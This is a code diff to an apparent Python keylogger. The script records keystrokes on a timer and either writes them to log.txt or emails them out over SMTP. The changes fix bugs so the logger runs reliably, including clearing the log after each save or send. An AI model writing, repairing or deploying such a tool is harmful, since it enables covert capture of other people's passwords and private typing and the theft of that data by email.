@@ -1,8 +1,14 @@
 
-import keyboard
+try:
+    import keyboard
+except:
+    print("keyboard library not installed")
+    exit()
+
 from threading import Semaphore, Timer
 import smtplib, ssl
 import getpass
+    
 
 SET_TIME = 60
 
@@ -28,22 +34,25 @@ class Keylogger:
             with smtplib.SMTP_SSL(stmp_server, port, context=context) as server:
                 server.login(self.sender_email, self.password)
                 server.sendmail(self.sender_email, self.receiver_email, self.log)
-        except Exception:
-            print(Exception)
+        except Exception as error:
+            print(error)
             self.semaphore.release()
 
         
-        self.name = ""
+        self.log = ""
 
     def save_what_u_got(self):
 
         self.flag = 1
+        
         if self.option == "1":
                 with open("log.txt", "a") as log:
                     log.write(self.log)
         else:
             self.send_email()
-    
+        
+        self.log = ""
+
 
     def call(self, event):
 
